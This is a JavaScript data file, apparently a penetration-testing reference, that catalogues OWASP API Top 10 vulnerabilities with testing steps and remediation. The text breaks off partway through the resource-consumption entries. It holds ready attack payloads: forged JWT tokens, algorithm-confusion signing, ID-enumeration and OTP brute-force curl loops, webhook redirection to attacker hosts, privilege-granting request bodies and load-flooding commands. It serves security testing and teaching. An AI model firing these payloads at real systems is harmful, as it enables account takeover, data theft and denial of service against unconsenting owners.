// ============================================================================
// API Security Testing Reference
// Comprehensive vulnerability database for API penetration testing
// ============================================================================

// ----------------------------------------------------------------------------
// 1. API_VULNS -- OWASP API Top 10 (2023) + Extended Vulnerability Types
// ----------------------------------------------------------------------------

const API_VULNS = [

  // ── BOLA: Broken Object Level Authorization (API1:2023) ──────────────

  {
    id: "API1-01",
    name: "Direct IDOR via Path Parameter",
    category: "Broken Object Level Authorization",
    description: "Attacker modifies resource IDs in URL path to access objects belonging to other users. The API does not validate that the authenticated user owns the requested resource.",
    testingSteps: [
      "Authenticate as User A and note resource IDs in API responses",
      "Capture a request referencing a specific resource (e.g., GET /api/v1/users/1001/orders/5001)",
      "Replace the resource ID with one belonging to User B (e.g., /orders/5002)",
      "Send the modified request and observe if data is returned",
      "Test with sequential IDs, UUIDs from other user sessions, and predictable patterns"
    ],
    payloads: [
      "GET /api/v1/users/1001/profile -> GET /api/v1/users/1002/profile",
      "GET /api/v1/orders/{{other_user_order_id}}",
      "DELETE /api/v1/documents/{{other_user_doc_id}}",
      "PATCH /api/v1/accounts/{{other_user_account}} -d '{\"email\":\"attacker@evil.com\"}'",
      "GET /api/v1/invoices?user_id=victim_id"
    ],
    remediation: "Implement object-level authorization checks on every endpoint. Validate that the authenticated user has permission to access, modify, or delete the specific object. Use non-guessable identifiers (UUIDs) and enforce ownership validation at the data layer.",
    severity: "Critical"
  },
  {
    id: "API1-02",
    name: "BOLA via Request Body Parameter",
    category: "Broken Object Level Authorization",
    description: "API accepts resource identifiers in the request body without verifying ownership. Attacker tampers with body parameters referencing other users' objects.",
    testingSteps: [
      "Intercept a POST/PUT request that includes a resource ID in the body",
      "Identify parameters like user_id, account_id, order_id in JSON body",
      "Replace these IDs with values from another user's session",
      "Submit the modified request and check if the operation succeeds",
      "Verify whether the API performed the action on the other user's resource"
    ],
    payloads: [
      "POST /api/transfer -d '{\"from_account\":\"victim_account\",\"to_account\":\"attacker_account\",\"amount\":1000}'",
      "PUT /api/profile -d '{\"user_id\":\"other_user\",\"email\":\"attacker@evil.com\"}'",
      "POST /api/share -d '{\"document_id\":\"victim_doc\",\"share_with\":\"attacker\"}'",
      "PATCH /api/settings -d '{\"account_id\":\"victim_id\",\"notifications\":false}'"
    ],
    remediation: "Never trust client-supplied resource identifiers in the request body. Derive the owning user from the authenticated session token. Validate all referenced object IDs against the authenticated principal before performing any operation.",
    severity: "Critical"
  },
  {
    id: "API1-03",
    name: "BOLA via Query String Manipulation",
    category: "Broken Object Level Authorization",
    description: "API filtering or lookup endpoints accept user-controlled query parameters that reference objects without authorization checks.",
    testingSteps: [
      "Identify endpoints that accept object references as query parameters",
      "Test parameters like ?user_id=, ?account=, ?owner= with other users' values",
      "Check if results include data belonging to the substituted user",
      "Test with wildcard values, empty values, and array parameters"
    ],
    payloads: [
      "GET /api/v1/transactions?account_id=victim_account_id",
      "GET /api/v1/files?owner_id=other_user_id",
      "GET /api/v1/messages?conversation_id=private_convo_id",
      "GET /api/v1/reports?department_id=restricted_dept"
    ],
    remediation: "Apply authorization filters server-side. Scope all queries to the authenticated user's accessible resources. Do not allow client-side specification of ownership filters without server-side enforcement.",
    severity: "High"
  },
  {
    id: "API1-04",
    name: "BOLA via Nested Resource Traversal",
    category: "Broken Object Level Authorization",
    description: "API with nested resource paths (e.g., /users/{id}/orders/{id}/items/{id}) may validate the top-level resource but not the nested ones, allowing cross-tenant access through valid parent IDs.",
    testingSteps: [
      "Map out nested resource hierarchies in the API",
      "Authenticate and access a valid nested resource chain",
      "Replace only the nested resource ID while keeping a valid parent",
      "Test mixing parent IDs from User A with child IDs from User B",
      "Check if the API validates the full ownership chain"
    ],
    payloads: [
      "GET /api/v1/users/my_id/orders/other_user_order_id",
      "GET /api/v1/orgs/my_org/projects/other_org_project/files/secret_file",
      "DELETE /api/v1/teams/my_team/members/admin_user_id",
      "PUT /api/v1/companies/my_company/employees/other_company_employee"
    ],
    remediation: "Validate the entire resource ownership chain. Ensure that each nested resource actually belongs to its parent and that the authenticated user has access to the entire chain. Implement hierarchical authorization checks.",
    severity: "High"
  },
  {
    id: "API1-05",
    name: "BOLA via HTTP Method Switching",
    category: "Broken Object Level Authorization",
    description: "Authorization checks may only be enforced on certain HTTP methods. A GET request may be protected, but PUT or DELETE on the same resource path may lack authorization checks.",
    testingSteps: [
      "Find an endpoint where GET is properly authorized",
      "Try PUT, PATCH, DELETE, POST on the same endpoint with another user's resource ID",
      "Test HEAD and OPTIONS methods which may bypass authorization middleware",
      "Check if authorization is applied uniformly across all HTTP methods"
    ],
    payloads: [
      "GET /api/v1/users/other_id/data -> 403 ; PUT /api/v1/users/other_id/data -> 200?",
      "DELETE /api/v1/resources/other_resource_id (if GET is blocked)",
      "PATCH /api/v1/records/other_record_id -d '{\"status\":\"deleted\"}'",
      "POST /api/v1/users/other_id/actions -d '{\"action\":\"disable\"}'"
    ],
    remediation: "Apply authorization checks uniformly across all HTTP methods for every endpoint. Use a centralized authorization middleware that does not differentiate by HTTP verb. Implement deny-by-default policies.",
    severity: "High"
  },
  {
    id: "API1-06",
    name: "BOLA via Predictable ID Patterns",
    category: "Broken Object Level Authorization",
    description: "Sequential or predictable resource identifiers (auto-incrementing integers, timestamps, short hashes) allow attackers to enumerate and access other users' resources.",
    testingSteps: [
      "Create multiple resources and observe the ID pattern",
      "Check for sequential integers, timestamps, or short alphanumeric patterns",
      "Write a script to iterate through IDs and collect responses",
      "Analyze response codes and sizes to identify accessible resources",
      "Test boundary values (ID 0, 1, negative numbers, very large numbers)"
    ],
    payloads: [
      "for i in $(seq 1 1000); do curl -s -o /dev/null -w '%{http_code}' https://api.target.com/users/$i; done",
      "GET /api/v1/invoices/INV-0001 through INV-9999",
      "GET /api/v1/reports/2024-01-01 through 2024-12-31",
      "GET /api/v1/documents/doc_aa through doc_zz"
    ],
    remediation: "Use cryptographically random UUIDs (v4) for resource identifiers. Even with UUIDs, always enforce authorization checks. Implement rate limiting on enumeration-susceptible endpoints.",
    severity: "High"
  },
  {
    id: "API1-07",
    name: "BOLA via GraphQL Node Queries",
    category: "Broken Object Level Authorization",
    description: "GraphQL APIs implementing the Relay Node interface allow querying any object by its global ID. Without per-type authorization, any authenticated user can access any node.",
    testingSteps: [
      "Identify if the API implements the Relay Node interface",
      "Obtain a global node ID for a resource you own",
      "Decode the node ID (usually base64 of type:id)",
      "Forge node IDs for other resource types and IDs",
      "Query node(id: forged_id) and observe results"
    ],
    payloads: [
      "query { node(id: \"VXNlcjoxMDAy\") { ... on User { email ssn } } }",
      "query { node(id: \"T3JkZXI6OTk5OQ==\") { ... on Order { total items { name } } } }",
      "query { node(id: \"QWNjb3VudDo1MDA=\") { ... on Account { balance } } }",
      "query { nodes(ids: [\"id1\", \"id2\", \"id3\"]) { ... on PrivateData { content } } }"
    ],
    remediation: "Implement authorization checks in every GraphQL resolver, including the node() resolver. Validate that the authenticated user has access to the resolved type and instance. Do not rely on the obscurity of node IDs.",
    severity: "Critical"
  },
  {
    id: "API1-08",
    name: "BOLA via Webhook/Callback Manipulation",
    category: "Broken Object Level Authorization",
    description: "APIs that allow users to configure webhooks or callbacks for specific resources may not verify that the user owns the resource they are subscribing to, allowing interception of other users' events.",
    testingSteps: [
      "Find webhook registration endpoints",
      "Register a webhook for a resource you own and note the request format",
      "Change the resource identifier to one belonging to another user",
      "Submit and check if the webhook is registered successfully",
      "Wait for events to arrive at your webhook endpoint"
    ],
    payloads: [
      "POST /api/webhooks -d '{\"resource_id\":\"other_user_resource\",\"url\":\"https://attacker.com/hook\"}'",
      "PUT /api/subscriptions -d '{\"event\":\"payment.received\",\"account\":\"victim_account\",\"endpoint\":\"https://evil.com\"}'",
      "POST /api/notifications/subscribe -d '{\"channel\":\"private_channel\",\"webhook\":\"https://attacker.com\"}'"
    ],
    remediation: "Validate resource ownership before allowing webhook/subscription registration. Implement webhook signing to ensure authenticity. Audit webhook registrations regularly.",
    severity: "High"
  },
  {
    id: "API1-09",
    name: "BOLA via File/Export Endpoints",
    category: "Broken Object Level Authorization",
    description: "Export or file download endpoints often reference resources by ID and may lack authorization checks, allowing download of other users' reports, exports, or uploaded files.",
    testingSteps: [
      "Identify file download or export endpoints",
      "Note the resource identifier format in download URLs",
      "Substitute IDs from other users or enumerate common patterns",
      "Check if files are served without authorization verification",
      "Test direct access to storage URLs if they are exposed"
    ],
    payloads: [
      "GET /api/v1/exports/report_victim_id.pdf",
      "GET /api/v1/files/download?id=other_user_file_uuid",
      "GET /api/v1/attachments/private_attachment_hash",
      "GET /storage/uploads/user_victim/confidential.docx"
    ],
    remediation: "Enforce authorization on all file and export endpoints. Use signed URLs with short expiration times. Do not expose internal storage paths. Validate file ownership at the application layer.",
    severity: "High"
  },
  {
    id: "API1-10",
    name: "BOLA via Batch/Bulk Operations",
    category: "Broken Object Level Authorization",
    description: "Batch or bulk API endpoints that accept arrays of resource IDs may not perform per-item authorization, allowing inclusion of other users' resource IDs in bulk operations.",
    testingSteps: [
      "Find batch/bulk endpoints (e.g., POST /api/batch, DELETE /api/bulk)",
      "Submit a batch request with your own resource IDs",
      "Add one or more resource IDs belonging to another user",
      "Check if the operation processes all IDs without authorization errors",
      "Verify results to see if unauthorized resources were affected"
    ],
    payloads: [
      "POST /api/v1/batch/delete -d '{\"ids\":[\"my_id_1\",\"my_id_2\",\"victim_id_1\",\"victim_id_2\"]}'",
      "PUT /api/v1/bulk/update -d '{\"items\":[{\"id\":\"victim_id\",\"status\":\"cancelled\"}]}'",
      "POST /api/v1/batch/export -d '{\"document_ids\":[\"own_doc\",\"victim_doc_1\",\"victim_doc_2\"]}'"
    ],
    remediation: "Validate authorization for every item in a batch request. Reject the entire batch or exclude unauthorized items with appropriate error messages. Log bulk authorization failures for security monitoring.",
    severity: "Critical"
  },

  // ── Broken Authentication (API2:2023) ────────────────────────────────

  {
    id: "API2-01",
    name: "Credential Stuffing on Login Endpoint",
    category: "Broken Authentication",
    description: "Login endpoints lacking rate limiting or account lockout allow automated testing of stolen credential pairs from data breaches.",
    testingSteps: [
      "Identify the login endpoint and authentication flow",
      "Test if there is any rate limiting by sending rapid requests",
      "Check if account lockout mechanisms exist after N failed attempts",
      "Test with common credential lists and observe response differences",
      "Check if CAPTCHA or MFA challenges are triggered"
    ],
    payloads: [
      "POST /api/auth/login -d '{\"email\":\"victim@corp.com\",\"password\":\"Password123\"}'",
      "POST /api/auth/login -d '{\"email\":\"admin@corp.com\",\"password\":\"admin\"}'",
      "POST /api/v1/session -d '{\"username\":\"user1\",\"password\":\"letmein\"}'",
      "POST /api/oauth/token -d 'grant_type=password&username=admin&password=123456'"
    ],
    remediation: "Implement rate limiting per IP and per account. Add progressive delays or account lockout after failed attempts. Require CAPTCHA after suspicious activity. Enforce MFA for sensitive accounts. Monitor for credential stuffing patterns.",
    severity: "High"
  },
  {
    id: "API2-02",
    name: "Weak Password Policy Exploitation",
    category: "Broken Authentication",
    description: "API does not enforce strong password requirements, allowing users to set weak passwords that are vulnerable to brute force and dictionary attacks.",
    testingSteps: [
      "Test password creation with very short passwords (1-3 characters)",
      "Test with common passwords (password, 123456, qwerty)",
      "Check if passwords require mixed case, numbers, or special characters",
      "Test if the API allows previously breached passwords",
      "Verify maximum password length is reasonable (not too short)"
    ],
    payloads: [
      "POST /api/v1/users/register -d '{\"email\":\"test@test.com\",\"password\":\"a\"}'",
      "PUT /api/v1/users/me/password -d '{\"new_password\":\"123\"}'",
      "POST /api/v1/auth/reset-password -d '{\"token\":\"valid_token\",\"new_password\":\"password\"}'",
      "PATCH /api/v1/profile -d '{\"password\":\"1111\"}'"
    ],
    remediation: "Enforce minimum password length (12+ characters). Require complexity (mixed case, numbers, symbols). Check passwords against known breach databases (HaveIBeenPwned API). Implement password strength meters.",
    severity: "Medium"
  },
  {
    id: "API2-03",
    name: "Token Leakage in URL and Logs",
    category: "Broken Authentication",
    description: "Authentication tokens passed as URL parameters are logged in server access logs, browser history, proxy logs, and referrer headers, leading to credential exposure.",
    testingSteps: [
      "Check if API accepts tokens via query parameters",
      "Inspect if tokens appear in URL paths or query strings",
      "Check the Referer header when navigating away from authenticated pages",
      "Examine server logs and proxy logs for token exposure",
      "Test if shared links contain authentication tokens"
    ],
    payloads: [
      "GET /api/v1/data?access_token=eyJhbGciOiJIUzI1NiJ9...",
      "GET /api/v1/resource?api_key=sk-live-abc123def456",
      "GET /api/v1/download?session_id=a1b2c3d4e5f6",
      "GET /api/v1/webhook?secret=mysecrettoken123"
    ],
    remediation: "Always pass tokens in the Authorization header, never in URLs. Strip sensitive query parameters from logs. Implement token rotation. Use short-lived tokens. Configure servers to not log Authorization headers.",
    severity: "High"
  },
  {
    id: "API2-04",
    name: "JWT None Algorithm Attack",
    category: "Broken Authentication",
    description: "JWT library accepts 'none' as a valid signing algorithm, allowing attackers to forge tokens without a secret key by simply removing the signature.",
    testingSteps: [
      "Decode a valid JWT and examine the header",
      "Change the 'alg' field in the header to 'none', 'None', 'NONE', or 'nOnE'",
      "Remove the signature portion (everything after the last dot)",
      "Re-encode the header and payload as base64url",
      "Submit the forged token and check if it is accepted"
    ],
    payloads: [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpc19hZG1pbiI6dHJ1ZX0.",
      "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic3VwZXJhZG1pbiJ9."
    ],
    remediation: "Explicitly reject the 'none' algorithm in JWT verification. Use an allowlist of accepted algorithms. Pin the expected algorithm server-side rather than trusting the token header.",
    severity: "Critical"
  },
  {
    id: "API2-05",
    name: "JWT Algorithm Confusion (RS256 to HS256)",
    category: "Broken Authentication",
    description: "When an API uses RS256 (asymmetric), an attacker can switch the algorithm to HS256 (symmetric) and sign the token with the public key, which the server may accept as the HMAC secret.",
    testingSteps: [
      "Obtain the server's RSA public key (from JWKS endpoint, TLS cert, etc.)",
      "Decode a valid JWT and change the alg from RS256 to HS256",
      "Modify the payload as desired (e.g., set admin role)",
      "Sign the modified token using HMAC-SHA256 with the public key as the secret",
      "Submit the forged token and check if the server accepts it"
    ],
    payloads: [
      "python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, open('public.pem').read(), algorithm='HS256'))\"",
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"} signed with RSA public key bytes",
      "jwt_tool <token> -X k -pk public.pem",
      "jwt.io with algorithm set to HS256 and secret = public key content"
    ],
    remediation: "Pin the expected algorithm server-side (never trust the token's alg claim). Use separate key sets for symmetric and asymmetric operations. Upgrade JWT libraries to versions that prevent algorithm confusion.",
    severity: "Critical"
  },
  {
    id: "API2-06",
    name: "Brute Force OTP/Reset Token",
    category: "Broken Authentication",
    description: "Short or numeric OTP codes and password reset tokens without rate limiting can be brute-forced, allowing account takeover.",
    testingSteps: [
      "Trigger an OTP or password reset flow",
      "Determine the OTP/token format (length, character set)",
      "Calculate the keyspace (e.g., 4-digit = 10,000 possibilities)",
      "Test rapid submission of multiple OTP values",
      "Check if the token expires, and if rate limiting is applied"
    ],
    payloads: [
      "for i in $(seq 0000 9999); do curl -s -X POST /api/auth/verify-otp -d \"{\\\"otp\\\":\\\"$(printf '%04d' $i)}\\\"\"; done",
      "POST /api/auth/reset-password -d '{\"token\":\"000000\"}' through '{\"token\":\"999999\"}'",
      "POST /api/auth/verify -d '{\"code\":\"1234\"}' (common OTP values first)",
      "POST /api/auth/mfa -d '{\"totp\":\"000000\"}' through '{\"totp\":\"999999\"}'"
    ],
    remediation: "Use cryptographically random tokens of sufficient length (32+ characters). Limit OTP attempts (3-5 tries). Implement exponential backoff. Expire tokens quickly (5-10 minutes). Lock out after repeated failures.",
    severity: "High"
  },
  {
    id: "API2-07",
    name: "Session Fixation via API",
    category: "Broken Authentication",
    description: "API allows setting or reusing session identifiers before authentication, enabling an attacker to fixate a session and hijack it after the victim authenticates.",
    testingSteps: [
      "Obtain a session token from the API without authenticating",
      "Use this token in a login request",
      "Check if the same session token is retained after successful login",
      "If so, provide this pre-auth token to a victim (via link, etc.)",
      "After the victim authenticates, use the same token to access their session"
    ],
    payloads: [
      "GET /api/session -> {session_id: 'abc123'} ; POST /api/login (with session_id: 'abc123')",
      "Cookie: session=attacker_controlled_value ; POST /api/auth/login",
      "POST /api/auth/login -H 'X-Session-Id: fixed_session_id'",
      "POST /api/auth/callback?session=pre_set_session_token"
    ],
    remediation: "Always regenerate session identifiers after authentication. Never accept client-supplied session IDs. Invalidate pre-authentication sessions upon login. Bind sessions to client fingerprints.",
    severity: "High"
  },
  {
    id: "API2-08",
    name: "Insecure Password Reset Flow",
    category: "Broken Authentication",
    description: "Password reset mechanisms that leak tokens in responses, use predictable tokens, or do not properly validate token-to-user binding allow account takeover.",
    testingSteps: [
      "Trigger a password reset for your account",
      "Check if the reset token appears in the API response body",
      "Analyze token predictability (time-based, sequential, short)",
      "Test if a reset token from User A can be used for User B",
      "Check if tokens are single-use and time-limited"
    ],
    payloads: [
      "POST /api/auth/forgot-password -d '{\"email\":\"victim@corp.com\"}' -> check response for token",
      "POST /api/auth/reset -d '{\"token\":\"predictable_token\",\"email\":\"victim@corp.com\",\"new_password\":\"pwned\"}'",
      "POST /api/auth/reset -d '{\"token\":\"userA_token\",\"email\":\"userB@corp.com\",\"new_password\":\"pwned\"}'",
      "POST /api/auth/reset -d '{\"token\":\"expired_token\",\"new_password\":\"test\"}' (check expiry enforcement)"
    ],
    remediation: "Use cryptographically random reset tokens (64+ characters). Never expose tokens in API responses. Bind tokens to specific users. Expire tokens after 15-30 minutes. Invalidate after single use. Send tokens only via email/SMS.",
    severity: "Critical"
  },
  {
    id: "API2-09",
    name: "Missing Authentication on Internal Endpoints",
    category: "Broken Authentication",
    description: "API endpoints intended for internal use (admin panels, health checks, debug endpoints) are exposed without authentication requirements.",
    testingSteps: [
      "Enumerate API endpoints through documentation, JavaScript files, and fuzzing",
      "Look for paths containing admin, internal, debug, health, status, metrics",
      "Test these endpoints without any authentication headers",
      "Check for Swagger/OpenAPI docs at common paths",
      "Test with internal IP spoofing headers if external access is blocked"
    ],
    payloads: [
      "GET /api/internal/users (no auth header)",
      "GET /api/admin/config (no auth header)",
      "GET /api/debug/vars",
      "GET /api/health/detailed",
      "GET /actuator/env",
      "GET /api/v1/swagger.json",
      "GET /api/metrics"
    ],
    remediation: "Require authentication on all endpoints. Use network segmentation for truly internal endpoints. Do not expose admin/debug endpoints publicly. Implement authentication middleware globally with explicit opt-out rather than opt-in.",
    severity: "Critical"
  },
  {
    id: "API2-10",
    name: "Token Not Invalidated on Logout/Password Change",
    category: "Broken Authentication",
    description: "API tokens (JWT or session tokens) remain valid after the user logs out or changes their password, allowing continued access with stolen tokens.",
    testingSteps: [
      "Authenticate and save the access token",
      "Use the token to make authenticated requests (verify it works)",
      "Log out via the API",
      "Try using the same token again",
      "Change the password and repeat the test with the old token"
    ],
    payloads: [
      "POST /api/auth/logout ; GET /api/v1/me (with old token)",
      "PUT /api/v1/me/password -d '{\"new_password\":\"changed\"}' ; GET /api/v1/me (with old token)",
      "DELETE /api/v1/sessions/current ; GET /api/v1/data (with old token)",
      "POST /api/auth/revoke ; GET /api/v1/protected (with revoked token)"
    ],
    remediation: "Implement a token deny-list or use short-lived tokens with refresh token rotation. Invalidate all sessions on password change. For JWTs, use short expiration (15 minutes) with refresh tokens. Maintain a server-side session store for revocation.",
    severity: "High"
  },

  // ── Broken Object Property Level Authorization (API3:2023) ───────────

  {
    id: "API3-01",
    name: "Mass Assignment / Excessive Data Binding",
    category: "Broken Object Property Level Authorization",
    description: "API automatically binds client-supplied properties to internal objects. Attackers add extra properties (like role, isAdmin, balance) that are not intended to be client-modifiable.",
    testingSteps: [
      "Study the API response to understand object properties",
      "Identify sensitive properties (role, permissions, balance, verified)",
      "Add these properties to a POST/PUT/PATCH request body",
      "Check if the server accepts and persists the extra properties",
      "Verify by querying the object again"
    ],
    payloads: [
      "PUT /api/v1/users/me -d '{\"name\":\"Test\",\"role\":\"admin\"}'",
      "PATCH /api/v1/profile -d '{\"bio\":\"hello\",\"is_admin\":true,\"verified\":true}'",
      "POST /api/v1/accounts -d '{\"name\":\"New\",\"balance\":999999,\"tier\":\"enterprise\"}'",
      "PUT /api/v1/users/me -d '{\"email\":\"me@me.com\",\"permissions\":[\"admin\",\"superuser\"]}'"
    ],
    remediation: "Use explicit allowlists for properties that clients can modify. Never automatically bind all input fields to internal models. Implement DTOs (Data Transfer Objects) that define exactly which fields are accepted for each operation.",
    severity: "High"
  },
  {
    id: "API3-02",
    name: "Excessive Data Exposure in Responses",
    category: "Broken Object Property Level Authorization",
    description: "API returns entire database objects including sensitive fields (passwords, tokens, SSN, internal IDs) rather than filtering to only necessary properties.",
    testingSteps: [
      "Make authenticated API requests and examine full response bodies",
      "Look for sensitive fields: password hashes, secret keys, SSNs, internal metadata",
      "Check list endpoints that return multiple objects (bulk exposure)",
      "Compare response properties with what the UI actually displays",
      "Test with different user roles to see if filtering varies"
    ],
    payloads: [
      "GET /api/v1/users -> check for password_hash, ssn, api_key fields",
      "GET /api/v1/users/me -> check for internal_id, created_by, debug fields",
      "GET /api/v1/orders?expand=all -> check for payment details, addresses",
      "GET /api/v1/employees -> check for salary, performance_review fields"
    ],
    remediation: "Implement response filtering at the serialization layer. Define explicit response schemas per endpoint and role. Never return raw database objects. Remove sensitive fields before sending responses. Use different serializers for different access levels.",
    severity: "High"
  },
  {
    id: "API3-03",
    name: "Hidden Parameter Discovery",
    category: "Broken Object Property Level Authorization",
    description: "APIs may accept parameters not documented in the public API docs but present in the codebase. These hidden parameters can modify object behavior or bypass restrictions.",
    testingSteps: [
      "Review client-side JavaScript for API parameter names",
      "Test adding common parameters: debug, test, internal, admin, verbose",
      "Use parameter wordlists with tools like Arjun or ParamMiner",
      "Check API documentation diffs between versions for removed parameters",
      "Test parameters found in error messages or debug output"
    ],
    payloads: [
      "GET /api/v1/search?q=test&debug=true",
      "POST /api/v1/order -d '{\"item\":\"A\",\"price\":0,\"discount\":100}'",
      "PUT /api/v1/user -d '{\"name\":\"Test\",\"_internal_role\":\"admin\"}'",
      "GET /api/v1/data?fields=*&include_deleted=true&show_private=true"
    ],
    remediation: "Implement strict input validation with allowlists. Reject unknown parameters. Do not rely on obscurity for security. Remove debug/internal parameters from production builds. Use schema validation (JSON Schema, OpenAPI) on all inputs.",
    severity: "Medium"
  },
  {
    id: "API3-04",
    name: "Privilege Escalation via Property Manipulation",
    category: "Broken Object Property Level Authorization",
    description: "API allows modifying user privilege-related properties through normal update endpoints, enabling horizontal or vertical privilege escalation.",
    testingSteps: [
      "Identify user profile or settings update endpoints",
      "Test adding privilege-related fields: group_id, department, clearance_level",
      "Attempt to change tenant or organization membership",
      "Try setting feature flags or entitlements through profile updates",
      "Test updating subscription tier or plan through user endpoints"
    ],
    payloads: [
      "PATCH /api/v1/me -d '{\"organization_id\":\"target_org\",\"role\":\"owner\"}'",
      "PUT /api/v1/profile -d '{\"tenant_id\":\"other_tenant\",\"permissions\":[\"*\"]}'",
      "POST /api/v1/users/me/settings -d '{\"feature_flags\":{\"admin_panel\":true}}'",
      "PATCH /api/v1/account -d '{\"plan\":\"enterprise\",\"seats\":999}'"
    ],
    remediation: "Separate user-modifiable properties from system-managed properties. Use different endpoints and authorization levels for privilege-related changes. Implement field-level authorization checks.",
    severity: "Critical"
  },
  {
    id: "API3-05",
    name: "Write Access to Read-Only Properties",
    category: "Broken Object Property Level Authorization",
    description: "Properties that should be read-only (created_at, updated_by, version) can be modified through API requests, potentially enabling audit log tampering or business logic bypass.",
    testingSteps: [
      "Identify properties in responses that appear auto-generated",
      "Try including these properties in update requests",
      "Test modifying timestamps (created_at, updated_at)",
      "Test modifying audit fields (created_by, modified_by)",
      "Test modifying computed fields (total, tax, discount)"
    ],
    payloads: [
      "PUT /api/v1/orders/123 -d '{\"status\":\"shipped\",\"created_at\":\"2020-01-01\",\"total\":0.01}'",
      "PATCH /api/v1/records/456 -d '{\"version\":999,\"updated_by\":\"admin\"}'",
      "PUT /api/v1/invoices/789 -d '{\"tax\":0,\"total\":0,\"paid\":true}'",
      "PATCH /api/v1/audit/entry -d '{\"timestamp\":\"2019-01-01\",\"action\":\"approved\"}'"
    ],
    remediation: "Mark properties as read-only at the schema level. Ignore client-supplied values for auto-generated fields. Use immutable patterns for audit data. Validate that computed fields cannot be overridden.",
    severity: "Medium"
  },
  {
    id: "API3-06",
    name: "Selective Field Expansion Abuse",
    category: "Broken Object Property Level Authorization",
    description: "APIs supporting field selection or expansion (fields=, expand=, include=) may expose sensitive related objects or properties when the user specifies fields they should not access.",
    testingSteps: [
      "Test field selection parameters: ?fields=email,password_hash,ssn",
      "Test expansion parameters: ?expand=user.secrets,payment_details",
      "Test include parameters: ?include=internal_notes,admin_comments",
      "Check if nested expansions expose protected resources",
      "Test wildcard selectors: ?fields=* or ?expand=**"
    ],
    payloads: [
      "GET /api/v1/orders?expand=customer.ssn,customer.payment_methods",
      "GET /api/v1/users?fields=id,name,password_hash,api_secret",
      "GET /api/v1/projects?include=private_config,secrets",
      "GET /api/v1/teams?expand=members.salary,members.review_score"
    ],
    remediation: "Implement authorization checks on field selection and expansion. Only allow expansion of resources the user is authorized to access. Maintain allowlists of expandable fields per role. Validate field selection against permitted schemas.",
    severity: "High"
  },
  {
    id: "API3-07",
    name: "JSON Merge Patch Property Injection",
    category: "Broken Object Property Level Authorization",
    description: "APIs using JSON Merge Patch (RFC 7396) may process null values to delete properties or accept unexpected property additions without proper validation.",
    testingSteps: [
      "Identify endpoints accepting PATCH with Content-Type: application/merge-patch+json",
      "Test setting sensitive properties to null to remove security controls",
      "Test adding new properties not present in the original object",
      "Test setting password or security question to null",
      "Verify if null values bypass required field validation"
    ],
    payloads: [
      "PATCH /api/v1/users/me -H 'Content-Type: application/merge-patch+json' -d '{\"mfa_enabled\":null}'",
      "PATCH /api/v1/accounts/123 -d '{\"security_question\":null,\"password_hash\":null}'",
      "PATCH /api/v1/settings -d '{\"rate_limit\":null,\"require_approval\":null}'",
      "PATCH /api/v1/policies/abc -d '{\"restrictions\":null,\"whitelist\":[\"*\"]}'"
    ],
    remediation: "Validate merge patch operations against allowed fields. Prevent null assignment to security-critical properties. Use JSON Patch (RFC 6902) for fine-grained control over operations. Implement field-level authorization for patch operations.",
    severity: "Medium"
  },
  {
    id: "API3-08",
    name: "Content Negotiation Data Leak",
    category: "Broken Object Property Level Authorization",
    description: "Different response formats (JSON, XML, CSV, YAML) may include different sets of properties, with some formats inadvertently including sensitive fields not present in the default format.",
    testingSteps: [
      "Request resources with different Accept headers",
      "Compare JSON response with XML, CSV, YAML responses",
      "Check if format conversion exposes additional fields",
      "Test with Accept: application/xml, text/csv, application/yaml",
      "Check if format parameter in URL provides different data (?format=xml)"
    ],
    payloads: [
      "GET /api/v1/users -H 'Accept: application/xml' (compare with JSON)",
      "GET /api/v1/data?format=csv (check for extra columns)",
      "GET /api/v1/export?type=full -H 'Accept: text/csv'",
      "GET /api/v1/reports -H 'Accept: application/yaml'"
    ],
    remediation: "Apply the same response filtering regardless of output format. Use a single serialization pipeline that strips sensitive fields before format conversion. Test all supported output formats for data consistency.",
    severity: "Medium"
  },

  // ── Unrestricted Resource Consumption (API4:2023) ────────────────────

  {
    id: "API4-01",
    name: "Missing Rate Limiting",
    category: "Unrestricted Resource Consumption",
    description: "API endpoints lack rate limiting, allowing unlimited requests that can lead to denial of service, brute force attacks, or resource exhaustion.",
    testingSteps: [
      "Send rapid requests to the same endpoint and measure response times",
      "Check for rate limit headers (X-RateLimit-Limit, X-RateLimit-Remaining)",
      "Test if rate limits apply per IP, per user, or per API key",
      "Test if rate limits can be bypassed with different API keys or IPs",
      "Measure server response degradation under load"
    ],
    payloads: [
      "for i in $(seq 1 10000); do curl -s -o /dev/null -w '%{http_code} %{time_total}\\n' https://api.target.com/endpoint; done",
      "parallel -j 100 curl -s https://api.target.com/search?q={} ::: $(seq 1 1000)",
      "ab -n 10000 -c 100 https://api.target.com/api/v1/resource",
      "vegeta attack -rate=500 -duration=60s -targets=targets.txt | vegeta report"
    ],
    remediation: "Implement rate limiting at the API gateway or middleware level. Use token bucket or sliding window algorithms. Set appropriate limits per endpoint based on expected usage. Return 429 Too Many Requests with Retry-After header.",
    severity: "High"
  },
  {
    id: "API4-02",
    name: "Unbounded Pagination / Large Result Sets",
    category: "Unrestricted Resource Consumption",
    description: "API does not enforce maximum page sizes, allowing clients to request extremely large result sets that exhaust server memory and database resources.",
    testingSteps: [
      "Test the limit/page_size parameter with very large values",
      "Check if there is a maximum enforced page size",
      "Test with limit=0, limit=-1, limit=999999999",
      "Measure response time and size as limit increases",
      "Check if the API returns all records when no limit is specified"
    ],
    payloads: [
      "GET /api/v1/users?limit=1000000&offset=0",
      "GET /api/v1/data?page_size=999999",
      "GET /api/v1/records?per_page=-1",
      "GET /api/v1/logs?limit=0 (may return all records in some frameworks)",
      "GET /api/v1/events?count=2147483647"
    ],
    remediation: "Enforce a maximum page size (e.g., 100 records). Default to a reasonable page size when not specified. Return pagination metadata (total_count, next_page). Reject negative or zero values for pagination parameters.",
    severity: "Medium"
  },
  {
    id: "API4-03",
    name: "Resource-Intensive Query Abuse",
    category: "Unrestricted Resource Consumption",
    description: "Complex search queries, deep joins, or expensive filter operations can be abused to consume excessive server resources, causing denial of service.",
    testingSteps: [
      "Identify search and filter endpoints",
      "Craft queries with deeply nested conditions",
